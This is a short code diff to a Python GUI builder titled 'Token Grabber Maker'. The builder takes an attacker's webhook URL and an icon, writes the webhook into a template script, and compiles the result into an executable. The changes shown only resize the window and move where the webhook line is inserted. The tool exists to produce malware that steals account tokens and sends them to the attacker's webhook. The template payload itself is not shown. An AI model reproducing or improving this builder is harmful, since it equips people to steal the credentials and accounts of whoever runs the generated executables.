@@ -38,7 +38,7 @@ def build():
         [sg.Text('Icon', size=(15, 1)), sg.InputText(size=(40, 1), key="iconpath"), sg.FileBrowse(file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="iconbrowse")],
         [sg.Button("Make EXE", size=(10, 1))]
     ]
-    window = sg.Window("Token Grabber Maker", layout=layout, size=(510, 140))
+    window = sg.Window("Token Grabber Maker", layout=layout)
     while True:
         event, value = window.read()
         if event in ("Exit", "Quit", None):
@@ -63,7 +63,7 @@ def build():
             with open("Files\\template.py", "r") as f:
                 lines = f.readlines()
             with open(f"Executable\\{value['name']}.py", "w") as f2:
-                lines.insert(10, f"url = \"{str(value['webhook'])}\"")
+                lines.insert(17, f"url_webhook = \"{str(value['webhook'])}\"")
                 f2.write("".join(lines))
             os.chdir('Executable\\')
             icon = value['iconpath']
